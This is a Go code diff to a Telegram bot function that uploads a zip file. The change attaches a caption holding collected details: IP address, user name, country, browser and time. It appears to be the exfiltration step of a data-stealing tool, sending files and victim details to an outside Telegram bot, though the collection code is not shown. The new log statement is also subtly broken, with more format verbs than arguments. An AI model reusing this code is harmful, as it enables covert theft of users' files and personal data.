@@ -1,6 +1,7 @@
 package pkg
 
 import (
+	"fmt"
 	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
 	"log"
 	"os"
@@ -42,12 +43,26 @@ func SendFileByBotTele(token string, path string) {
 
 	updates, err := bot.GetUpdatesChan(u)
 
+	message_telegram := CollectData()
+	caption := fmt.Sprintf("%s \n %s \n %s \n %s \n %s \n %s \n %s",
+		message_telegram.Time,
+		message_telegram.ReceivedDataBot,
+		message_telegram.BotType,
+		message_telegram.IPAddress,
+		message_telegram.UserName,
+		message_telegram.Country,
+		message_telegram.Browser)
+
 	for update := range updates {
 		if update.Message == nil { // ignore any non-Message Updates
 			continue
 		}
 
-		log.Printf("[%s] %s", update.Message.From.UserName, update.Message.Text)
+		log.Printf("%s \n %s \n %s \n %s  ",
+
+			update.Message.From.UserName,
+
+			update.Message.Text)
 
 		////
 
@@ -60,7 +75,7 @@ func SendFileByBotTele(token string, path string) {
 				FileID:      "",
 				File:        fileBytes,
 			},
-			Caption: "Here's your zip file!",
+			Caption: caption,
 		}
 
 		/////
